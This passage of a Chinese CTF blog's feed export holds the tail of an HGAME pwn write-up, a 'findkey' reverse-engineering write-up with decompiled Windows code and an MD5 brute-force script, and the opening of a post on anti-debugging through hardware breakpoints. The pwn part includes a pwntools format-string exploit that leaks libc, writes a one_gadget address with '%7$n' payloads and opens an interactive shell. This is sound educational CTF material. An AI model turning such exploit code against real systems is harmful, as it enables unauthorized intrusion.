addr_offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr_offset<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>rsp_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> addr_offset <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">231</span>
									<span class="token number">0x2b10</span>
    

<span class="token comment">#libc.symbols['__libc_start_main'] = 0x2b10</span>
<span class="token comment">#__libc_start_main 0x7f4ed9a1fb10 </span>
<span class="token comment">#0x7ffda43debd0</span>
<span class="token comment">#addr_offset: 0x7f4ed9a1fbf7</span>
<span class="token comment">#libc_base: 0x7f4ed99fe000</span>
<span class="token comment">#one : 0x7f4ed9b0841c</span>


<span class="token comment">#one = libc_base + 0x4f3d5 </span>
one <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x10a41c</span>


io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%7$n'</span><span class="token punctuation">,</span><span class="token string">'\x00\x00\x00\x00'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>rsp_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">24</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>main_76<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'%7$n'</span><span class="token punctuation">,</span><span class="token string">'\x00\x00\x00\x00'</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>rsp_addr<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token operator">*</span><span class="token number">24</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">~</span>                    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h4 id="Base全家福"><a href="#Base全家福" class="headerlink" title="Base全家福"></a>Base全家福</h4><p>base64，base32，base16一气呵成，谢谢送分题。</p>
]]></content>
      <categories>
        <category>HGAME</category>
      </categories>
      <tags>
        <tag>WP</tag>
        <tag>HGAME</tag>
      </tags>
  </entry>
  <entry>
    <title>findkey</title>
    <url>/2020/12/17/write_up_findkey/</url>
    <content><![CDATA[<h1 id="findkey-write-up"><a href="#findkey-write-up" class="headerlink" title="findkey write_up"></a>findkey write_up</h1><blockquote>
<p> 没想到给小明神秘盒子的论坛高手居然是本次ctf的策划人之一，在比赛的时候，神秘盒子再一次出现，小明下意识的再次重复之前的操作，结果显而易见得失败了，赶紧帮小明解答这个加了点佐料的盒子。 注意：得到的 flag 请包上 flag{} 提交</p>
</blockquote>
<h5 id="最近闲来事贼多，做一题逆向暂且表示自己是个re手（文明六超好玩）"><a href="#最近闲来事贼多，做一题逆向暂且表示自己是个re手（文明六超好玩）" class="headerlink" title="最近闲来事贼多，做一题逆向暂且表示自己是个re手（文明六超好玩）"></a>最近闲来事贼多，做一题逆向暂且表示自己是个re手（文明六超好玩）</h5><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/findkey1.jpg" alt="findkey1"></p>
<p> 打开一看，这不是微软的模板嘛，file选中可以下滑找到exit，help选中下滑有一个about，打开都没什么东西。怪不得叫做findkey。此时题目可能做什么我稍微清楚了点，不过由于我开发的少，所以中间还是有不少波折。</p>
<p> 这时候打开ida看看。从WinMain()入手。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __stdcall <span class="token function">WinMain</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">,</span> HINSTANCE hPrevInstance<span class="token punctuation">,</span> LPSTR lpCmdLine<span class="token punctuation">,</span> <span class="token keyword">int</span> nShowCmd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  CHAR Buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-84h] BYREF</span>
  HACCEL hAccTable<span class="token punctuation">;</span> <span class="token comment">// [esp+B0h] [ebp-20h]</span>
  <span class="token keyword">struct</span> <span class="token class-name">tagMSG</span> Msg<span class="token punctuation">;</span> <span class="token comment">// [esp+B4h] [ebp-1Ch] BYREF</span>

  <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>byte_428C54<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  dword_428C50 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">LoadStringA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x67u</span><span class="token punctuation">,</span> WindowName<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LoadStringA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x6Du</span><span class="token punctuation">,</span> ClassName<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">set</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//set something</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">sub_40100F</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> nShowCmd<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">LoadStringA</span><span class="token punctuation">(</span><span class="token operator">::</span>hInstance<span class="token punctuation">,</span> <span class="token number">0x6Eu</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  hAccTable <span class="token operator">=</span> <span class="token function">LoadAcceleratorsA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6D</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">GetMessageA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">TranslateAcceleratorA</span><span class="token punctuation">(</span>Msg<span class="token punctuation">.</span>hwnd<span class="token punctuation">,</span> hAccTable<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">TranslateMessage</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">DispatchMessageA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> Msg<span class="token punctuation">.</span>wParam<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>可以看出这里没有我们需要的东西，基本框架在这，我们应该找找WndProc，寻找程序在哪做手脚的。</p>
<p>跟进set( hInstance ),</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">ATOM __cdecl <span class="token function">sub_4011D0</span><span class="token punctuation">(</span>HINSTANCE hInstance<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  WNDCLASSEXA v2<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-30h] BYREF</span>

  v2<span class="token punctuation">.</span>cbSize <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>style <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>lpfnWndProc <span class="token operator">=</span> <span class="token punctuation">(</span>WNDPROC<span class="token punctuation">)</span><span class="token operator">&amp;</span>sub_401014<span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>cbClsExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>cbWndExtra <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hInstance <span class="token operator">=</span> hInstance<span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hIcon <span class="token operator">=</span> <span class="token function">LoadIconA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6B</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hCursor <span class="token operator">=</span> <span class="token function">LoadCursorA</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x7F00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hbrBackground <span class="token operator">=</span> <span class="token punctuation">(</span>HBRUSH<span class="token punctuation">)</span><span class="token number">6</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>lpszMenuName <span class="token operator">=</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">109</span><span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>lpszClassName <span class="token operator">=</span> ClassName<span class="token punctuation">;</span>
  v2<span class="token punctuation">.</span>hIconSm <span class="token operator">=</span> <span class="token function">LoadIconA</span><span class="token punctuation">(</span>hInstance<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPCSTR<span class="token punctuation">)</span><span class="token number">0x6C</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">RegisterClassExA</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>这里的sub_401014其实就定义了WndProc，而我找到这个还花了不少时间。跟进。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">sub_401014</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">JUMPOUT</span><span class="token punctuation">(</span><span class="token number">0x401640</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//这里0x401640标红了，说明这里没有解析到，</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>



<p>跟进一看，原来没有构造出函数，然后我就选中了一段区域自己构造了一个WndProc。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span> times <span class="token operator">==</span> <span class="token number">16</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>String<span class="token punctuation">,</span> <span class="token string">"ctf"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v22 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v23 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> String<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>Text<span class="token punctuation">,</span> <span class="token string">"Are you kidding me?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> Text<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token operator">++</span>times<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>由于这个地方看上去简单，我就先观察了一下，这里会跳出一个Messagebox，那我试试。根据微软的Msg的定义，0x208为WM_MBUTTON,然后这里在times变为16时执行了里面内容，否则就是++times。那我鼠标中键疯狂点看看。</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/findkey2.jpg" alt="findkey2"></p>
<p>哈哈，Are you kidding me ? definitely yes.</p>
<p>不过很遗憾这个和题目没啥关系。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> v11 <span class="token operator">==</span> <span class="token number">0x205</span> <span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6</span> <span class="token punctuation">)</span>
    <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v20<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> String1<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
    v7 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_40101E</span><span class="token punctuation">(</span>String1<span class="token punctuation">,</span> v7<span class="token punctuation">,</span> <span class="token punctuation">(</span>LPSTR<span class="token punctuation">)</span>String1<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>Str<span class="token punctuation">,</span> <span class="token string">"0kk`d1a`55k222k2a776jbfgd`06cjjb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">memset</span><span class="token punctuation">(</span>v17<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v17<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v18 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v19 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token function">strcpy</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token string">"SS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v13<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    v8 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Str<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_401005</span><span class="token punctuation">(</span>v13<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Str<span class="token punctuation">,</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">_strcmpi</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>String1<span class="token punctuation">,</span> Str<span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">SetWindowTextA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> <span class="token string">"flag&#123;&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> <span class="token string">"Are you kidding me?"</span><span class="token punctuation">,</span> <span class="token string">"^_^"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">ExitProcess</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">memcpy</span><span class="token punctuation">(</span>v12<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_423030<span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    v9 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v12<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">sub_401005</span><span class="token punctuation">(</span>v20<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v12<span class="token punctuation">,</span> v9<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">MessageBoxA</span><span class="token punctuation">(</span>hWndParent<span class="token punctuation">,</span> v12<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x32u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token operator">++</span>times<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>在这里发现了它其实是对String1作为一个输入，原始的输入到了v20，通过MD5加密后保存到String1和Str比较，而Str和String1没什么关系，幸好，不然F(x)&#x3D;&#x3D;G(Y,X)的函数更加复杂,也许以后我可以做一个这种的</p>
<h5 id="MARK-IT"><a href="#MARK-IT" class="headerlink" title="**********************************************************************MARK IT*****************************************************************"></a>******<em><strong><em>*</em>***************************************************************MARK IT*****************************************************************</strong></em></h5><pre class="line-numbers language-none"><code class="language-none">MD5 result
v18
0019F98C  63 38 38 33 37 62 32 33 66 66 38 61 61 61 38 61  c8837b23ff8aaa8a  
0019F99C  32 64 64 65 39 31 35 34 37 33 63 65 30 39 39 31  2dde915473ce0991  


v13
need to make xor
0019F880  57 5E 52 54 49 5F 01 6D 69 46 02 6E 5F 02 6C 57  W^RTI_.miF.n_.lW  
0019F890  5B 54 4C 00 00 00 00 00 53 53 00 00 30 6B 6B 60  [TL.....SS..0kk&#96;  



“”
C6DCE185903ADADFFF0673FB1FC7AEB6
“abcdefg”
7AC66C0F148DE9519B8BD264312C4D64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>由此我发现了MD5加密后的值，即Str，这里面用win Api 做到的hash加密也很值得学习。</p>
<p>然后就是暴力破解MD5（只有6位），这里我用了hashcat，是一个好东西，我写的脚本，直接歇菜</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#0r4nge的垃圾脚本</span>
<span class="token comment">#非常抱歉，俺这脚本跑不出来2333，就挂在这以后改改，多线程等等，字典太长也很麻烦害。</span>
<span class="token keyword">import</span> hashlib

<span class="token comment">#dic = "abcdefghijklmnokqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>
dic <span class="token operator">=</span> <span class="token string">"abcdefghijklmnokqrstuvwxyz"</span>
dic <span class="token operator">+=</span> <span class="token string">'\0x00'</span>
length <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>dic<span class="token punctuation">)</span>

<span class="token keyword">for</span> a <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> b <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">for</span> d <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">for</span> e <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">for</span> f <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        m <span class="token operator">=</span> dic<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>c<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>e<span class="token punctuation">]</span><span class="token operator">+</span>dic<span class="token punctuation">[</span>f<span class="token punctuation">]</span>
                        flag<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        flag<span class="token punctuation">.</span>update<span class="token punctuation">(</span>m<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                        md5<span class="token operator">=</span>flag<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">if</span> md5<span class="token operator">==</span><span class="token string">'c8837b23ff8aaa8a2dde915473ce0991'</span><span class="token punctuation">:</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">)</span>
                            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SUCCESSFUL"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h5 id="这里的hash加密函数其实可以借鉴一波的，我就mark了"><a href="#这里的hash加密函数其实可以借鉴一波的，我就mark了" class="headerlink" title="这里的hash加密函数其实可以借鉴一波的，我就mark了"></a>这里的hash加密函数其实可以借鉴一波的，我就mark了</h5><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">int __cdecl sub_4013A0(BYTE *LP____STRING1, DWORD dwDataLen, LPSTR LP____STRING2)
&#123;
  int result; &#x2F;&#x2F; eax
  DWORD i; &#x2F;&#x2F; [esp+4Ch] [ebp-24h]
  CHAR String2; &#x2F;&#x2F; [esp+50h] [ebp-20h]
  BYTE v6[16]; &#x2F;&#x2F; [esp+54h] [ebp-1Ch]
  DWORD pdwDataLen; &#x2F;&#x2F; [esp+64h] [ebp-Ch]
  HCRYPTHASH phHash; &#x2F;&#x2F; [esp+68h] [ebp-8h]
  HCRYPTPROV phProv; &#x2F;&#x2F; [esp+6Ch] [ebp-4h]

  if ( !CryptAcquireContextA(&amp;phProv, 0, 0, 1u, 0xF0000000) )
    return 0;
  if ( CryptCreateHash(phProv, 0x8003u, 0, 0, &amp;phHash) )          &#x2F;&#x2F;0x8003 MD5
  &#123;
    if ( CryptHashData(phHash, LP____STRING1, dwDataLen, 0) )
    &#123;
      CryptGetHashParam(phHash, 2u, v6, &amp;pdwDataLen, 0);  &#x2F;&#x2F;2u  HP_HASHVAL
      *LP____STRING2 &#x3D; 0;
      for ( i &#x3D; 0; i &lt; pdwDataLen; ++i )
      &#123;
        wsprintfA(&amp;String2, &quot;%02X&quot;, v6[i]);
        lstrcatA(LP____STRING2, &amp;String2);
      &#125;
      CryptDestroyHash(phHash);
      CryptReleaseContext(phProv, 0);
      result &#x3D; 1;
    &#125;
    else
    &#123;
      CryptDestroyHash(phHash);
      CryptReleaseContext(phProv, 0);
      result &#x3D; 0;
    &#125;
  &#125;
  else
  &#123;
    CryptReleaseContext(phProv, 0);
    result &#x3D; 0;
  &#125;
  return result;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>write_up</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>反调试之去除硬件断点</title>
    <url>/2020/11/10/anti_debug_hardware_breakpoint/</url>
    <content><![CDATA[<h2 id="反调试之去除硬件断点"><a href="#反调试之去除硬件断点" class="headerlink" title="反调试之去除硬件断点"></a>反调试之去除硬件断点</h2><p>首先介绍几个X86下调试寄存器D0…D7,已经没有D4，D5了在wiki上说是被D6，D7取代了。</p>
<h3 id="D0…D3"><a href="#D0…D3" class="headerlink" title="D0…D3"></a>D0…D3</h3><hr>
<p>Each of these <a href="https://en.wikipedia.org/wiki/Processor_register">registers</a> contains the <a href="https://en.wikipedia.org/wiki/Virtual_address">linear address</a> associated with one of four breakpoint conditions. Each <a href="https://en.wikipedia.org/wiki/Breakpoint">breakpoint</a> condition is further defined by bits in DR7.</p>
<p>The debug address registers are effective whether or not <a href="https://en.wikipedia.org/wiki/Paging">paging</a> is enabled. The addresses in these registers are linear addresses. If paging is enabled, the linear addresses are translated into <a href="https://en.wikipedia.org/wiki/Physical_address">physical addresses</a> by the processor’s <a href="https://en.wikipedia.org/wiki/Memory_management_unit">paging mechanism</a>. If paging is not enabled, these linear addresses are the same as physical addresses.</p>
